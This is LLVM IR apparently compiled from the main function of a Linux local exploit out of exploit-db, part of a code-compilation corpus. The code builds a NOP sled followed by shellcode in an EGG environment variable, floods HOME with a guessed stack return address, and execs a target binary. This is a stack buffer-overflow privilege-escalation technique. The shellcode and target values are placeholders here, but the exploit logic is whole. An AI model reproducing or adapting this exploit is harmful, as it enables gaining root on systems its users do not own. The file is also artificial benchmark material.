; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22884.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22884.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DEFAULT_OFFSET = common dso_local global i32 0, align 4
@BUFFER_SIZE = common dso_local global i32 0, align 4
@EGG_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [24 x i8] c"Can't allocate memory.\0A\00", align 1
@.str.1 = private unnamed_addr constant [21 x i8] c"Using address: 0x%x\0A\00", align 1
@ALIGN = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32* null, align 8
@NOP = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"HOME=\00", align 1
@BINARY = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %14 = load i32, i32* @DEFAULT_OFFSET, align 4
  store i32 %14, i32* %10, align 4
  %15 = load i32, i32* @BUFFER_SIZE, align 4
  store i32 %15, i32* %11, align 4
  %16 = load i32, i32* @EGG_SIZE, align 4
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %3, align 4
  %18 = icmp sgt i32 %17, 1
  br i1 %18, label %19, label %24

19:                                               ; preds = %2
  %20 = load i8**, i8*** %4, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @atoi(i8* %22)
  store i32 %23, i32* %11, align 4
  br label %24

24:                                               ; preds = %19, %2
  %25 = load i32, i32* %3, align 4
  %26 = icmp sgt i32 %25, 2
  br i1 %26, label %27, label %32

27:                                               ; preds = %24
  %28 = load i8**, i8*** %4, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30)
  store i32 %31, i32* %10, align 4
  br label %32

32:                                               ; preds = %27, %24
  %33 = load i32, i32* %3, align 4
  %34 = icmp sgt i32 %33, 3
  br i1 %34, label %35, label %40

35:                                               ; preds = %32
  %36 = load i8**, i8*** %4, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 3
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @atoi(i8* %38)
  store i32 %39, i32* %13, align 4
  br label %40

40:                                               ; preds = %35, %32
  %41 = load i32, i32* %11, align 4
  %42 = call i8* @malloc(i32 %41)
  store i8* %42, i8** %5, align 8
  %43 = icmp ne i8* %42, null
  br i1 %43, label %47, label %44

44:                                               ; preds = %40
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0))
  %46 = call i32 @exit(i32 0) #3
  unreachable

47:                                               ; preds = %40
  %48 = load i32, i32* %13, align 4
  %49 = call i8* @malloc(i32 %48)
  store i8* %49, i8** %7, align 8
  %50 = icmp ne i8* %49, null
  br i1 %50, label %54, label %51

51:                                               ; preds = %47
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0))
  %53 = call i32 @exit(i32 0) #3
  unreachable

54:                                               ; preds = %47
  %55 = call i32 (...) @get_esp()
  %56 = load i32, i32* %10, align 4
  %57 = sub nsw i32 %55, %56
  %58 = sext i32 %57 to i64
  store i64 %58, i64* %9, align 8
  %59 = load i64, i64* %9, align 8
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0), i64 %59)
  %61 = load i8*, i8** %5, align 8
  store i8* %61, i8** %6, align 8
  %62 = load i8*, i8** %6, align 8
  %63 = load i32, i32* @ALIGN, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8, i8* %62, i64 %64
  %66 = bitcast i8* %65 to i64*
  store i64* %66, i64** %8, align 8
  store i32 0, i32* %12, align 4
  br label %67

67:                                               ; preds = %75, %54
  %68 = load i32, i32* %12, align 4
  %69 = load i32, i32* %11, align 4
  %70 = icmp slt i32 %68, %69
  br i1 %70, label %71, label %78

71:                                               ; preds = %67
  %72 = load i64, i64* %9, align 8
  %73 = load i64*, i64** %8, align 8
  %74 = getelementptr inbounds i64, i64* %73, i32 1
  store i64* %74, i64** %8, align 8
  store i64 %72, i64* %73, align 8
  br label %75

75:                                               ; preds = %71
  %76 = load i32, i32* %12, align 4
  %77 = add nsw i32 %76, 4
  store i32 %77, i32* %12, align 4
  br label %67

78:                                               ; preds = %67
  %79 = load i8*, i8** %7, align 8
  store i8* %79, i8** %6, align 8
  store i32 0, i32* %12, align 4
  br label %80

80:                                               ; preds = %93, %78
  %81 = load i32, i32* %12, align 4
  %82 = load i32, i32* %13, align 4
  %83 = load i32*, i32** @shellcode, align 8
  %84 = call i32 @strlen(i32* %83)
  %85 = sub nsw i32 %82, %84
  %86 = sub nsw i32 %85, 1
  %87 = icmp slt i32 %81, %86
  br i1 %87, label %88, label %96

88:                                               ; preds = %80
  %89 = load i32, i32* @NOP, align 4
  %90 = trunc i32 %89 to i8
  %91 = load i8*, i8** %6, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 1
  store i8* %92, i8** %6, align 8
  store i8 %90, i8* %91, align 1
  br label %93

93:                                               ; preds = %88
  %94 = load i32, i32* %12, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %12, align 4
  br label %80

96:                                               ; preds = %80
  store i32 0, i32* %12, align 4
  br label %97

97:                                               ; preds = %111, %96
  %98 = load i32, i32* %12, align 4
  %99 = load i32*, i32** @shellcode, align 8
  %100 = call i32 @strlen(i32* %99)
  %101 = icmp slt i32 %98, %100
  br i1 %101, label %102, label %114

102:                                              ; preds = %97
  %103 = load i32*, i32** @shellcode, align 8
  %104 = load i32, i32* %12, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i32, i32* %103, i64 %105
  %107 = load i32, i32* %106, align 4
  %108 = trunc i32 %107 to i8
  %109 = load i8*, i8** %6, align 8
  %110 = getelementptr inbounds i8, i8* %109, i32 1
  store i8* %110, i8** %6, align 8
  store i8 %108, i8* %109, align 1
  br label %111

111:                                              ; preds = %102
  %112 = load i32, i32* %12, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %12, align 4
  br label %97

114:                                              ; preds = %97
  %115 = load i8*, i8** %5, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sub nsw i32 %116, 1
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8, i8* %115, i64 %118
  store i8 0, i8* %119, align 1
  %120 = load i8*, i8** %7, align 8
  %121 = load i32, i32* %13, align 4
  %122 = sub nsw i32 %121, 1
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds i8, i8* %120, i64 %123
  store i8 0, i8* %124, align 1
  %125 = load i8*, i8** %7, align 8
  %126 = call i32 @memcpy(i8* %125, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i32 4)
  %127 = load i8*, i8** %7, align 8
  %128 = call i32 @putenv(i8* %127)
  %129 = load i8*, i8** %5, align 8
  %130 = call i32 @memcpy(i8* %129, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0), i32 5)
  %131 = load i8*, i8** %5, align 8
  %132 = call i32 @putenv(i8* %131)
  %133 = load i32, i32* @BINARY, align 4
  %134 = load i32, i32* @BINARY, align 4
  %135 = call i32 @execlp(i32 %133, i32 %134, i32 0)
  ret void
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @get_esp(...) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @execlp(i32, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
